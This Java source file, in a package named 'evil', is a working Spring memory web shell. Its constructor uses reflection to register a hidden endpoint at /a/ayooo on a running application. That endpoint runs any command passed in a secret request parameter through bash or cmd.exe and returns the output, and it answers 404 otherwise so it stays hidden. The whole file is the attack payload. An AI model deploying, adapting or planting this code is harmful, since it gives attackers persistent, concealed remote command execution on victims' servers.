package evil;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;
import java.lang.reflect.Method;

public class MemTemplatesImpl {

    public MemTemplatesImpl() throws Exception {
        super();
        WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest());
        RequestMappingHandlerMapping mappingHandler = context.getBean(RequestMappingHandlerMapping.class);
        Method method = MemTemplatesImpl.class.getMethod("run");
        Method getMappingForMethod = mappingHandler.getClass().getDeclaredMethod("getMappingForMethod", Method.class, Class.class);
        getMappingForMethod.setAccessible(true);

        RequestMappingInfo mInfo = (RequestMappingInfo) getMappingForMethod.invoke(mappingHandler, method, MemTemplatesImpl.class);
        MemTemplatesImpl obj = new MemTemplatesImpl("a");
        mappingHandler.registerMapping(mInfo, obj, method);
    }
    public MemTemplatesImpl(String a) {}

    @RequestMapping("/a/ayooo") // memshell path
    public void run() {
        try {
            HttpServletRequest request = ((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest();
            HttpServletResponse response = ((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getResponse();

            String arg0 = request.getParameter("devme_63hdsbx");
            if (arg0 != null) {
                ProcessBuilder p;
                String o = "";
                PrintWriter w = response.getWriter();
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                } else {
                    p = new ProcessBuilder(new String[]{"/bin/bash", "-c", arg0});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next() : o;
                c.close();
                w.write(o);
                w.flush();
                w.close();
            } else {
                response.sendError(404);
            }
        } catch (Exception e) {}
    }
}